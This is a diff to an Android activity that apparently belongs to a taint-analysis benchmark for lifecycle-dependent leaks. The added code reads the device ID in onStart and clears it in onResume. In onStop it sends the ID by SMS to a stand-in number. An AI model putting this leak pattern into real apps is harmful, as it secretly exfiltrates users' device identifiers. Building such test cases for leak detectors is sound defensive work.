@@ -19,20 +19,41 @@ public class ActivityEventSequence2 extends Activity {
 
     private String d1 = "";
 
+    private String d3 = "";
+
+    private String d4 = "";
+
     private String recpNo = "5556";
 
     @Override
+    public void onCreate(Bundle instance) {
+        super.onCreate(instance);
+        setContentView(R.layout.activity_main);
+    }
+
+    @SuppressLint("MissingSuperCall")
+    @Override
+    protected void onRestart() {
+        this.d1 = "";
+    }
+
+    @Override
     public void onStart() {
+        super.onStart();
         TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
         this.d1 = tMgr.getDeviceId();
     }
 
     @Override
-    public void onSaveInstanceState(Bundle state) {
+    public void onResume() {
+        super.onResume();
         this.d1 = "";
     }
 
     @Override
     public void onStop() {
+        super.onStop();
+        if (!d1.isEmpty())
+            SmsManager.getDefault().sendTextMessage(recpNo, null, d1, null, null);
     }
 }
